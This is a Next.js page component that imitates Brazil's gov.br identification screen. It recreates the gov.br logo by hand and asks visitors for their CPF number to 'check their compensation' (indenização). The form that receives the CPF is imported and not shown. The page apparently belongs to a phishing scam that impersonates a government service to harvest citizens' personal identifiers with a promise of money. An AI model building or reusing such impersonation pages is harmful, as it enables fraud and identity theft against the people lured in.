import { Suspense } from 'react';
import CircleQuestion from '@/assets/imgs/circle-question-solid.svg';
import Card from '@/assets/imgs/id-card-solid.png';
import type { Metadata } from 'next';
import Image from 'next/image';
import { FormSearchCpf } from './_components/form-search';

export const metadata: Metadata = {
  title: 'Identificação',
};

export default function ConsultPage() {
  return (
    <div className="w-full min-h-screen bg-[#1351B4] space-y-8">
      <div className="sticky bg-white top-0 h-[62px] border-b border-white/90 shadow-xl  w-full flex items-center px-8">
        <svg width="120" height="40" viewBox="0 0 120 40">
          <title>GOV.BR</title>
          <text x="0" y="30" className="text-4xl" letterSpacing="-2">
            <tspan fill="#2864AE" className="font-black">
              g
            </tspan>
            <tspan fill="#F7B731" className="font-black">
              o
            </tspan>
            <tspan fill="#27AE60" className="font-black">
              v
            </tspan>
            <tspan fill="#2864AE" className="font-black">
              .b
            </tspan>
            <tspan fill="#F7B731" className="font-black">
              r
            </tspan>
          </text>
        </svg>
      </div>
      <div className="px-5">
        <Suspense fallback={<div>Carregando...</div>}>
          <div className="border text-card-foreground shadow-sm w-full max-w-[600px] h-[450px] p-4 rounded-2xl bg-white mt-5 flex flex-col space-y-6">
            <h3 className="text-black font-semibold text-base">
              Identifique-se no gov.br com:
            </h3>

            <div className="space-y-6">
              <div className="flex items-center gap-2">
                <Image src={Card} alt="Logo" width={25} height={25} priority />
                <span className="text-sm text-[#333333]">Número do CPF</span>
              </div>
              <p className="text-sm text-[#333333]">
                Digite seu CPF para{' '}
                <span className="font-bold text-black">consultar</span> sua
                indenização
              </p>
            </div>

            <FormSearchCpf />

            <div className="flex items-center justify-center pt-16">
              <button
                type="button"
                className="text-[#1351B4] hover:text-[#1351B4]/90 text-lg hover:underline flex items-center justify-center gap-3"
              >
                <div className="relative size-4">
                  <Image alt="logo" fill priority src={CircleQuestion} />
                </div>
                <span className="text-[#1351B4] font-medium text-xs">
                  Está com dúvidas e precisa de ajuda?
                </span>
              </button>
            </div>
          </div>
        </Suspense>
      </div>
    </div>
  );
}
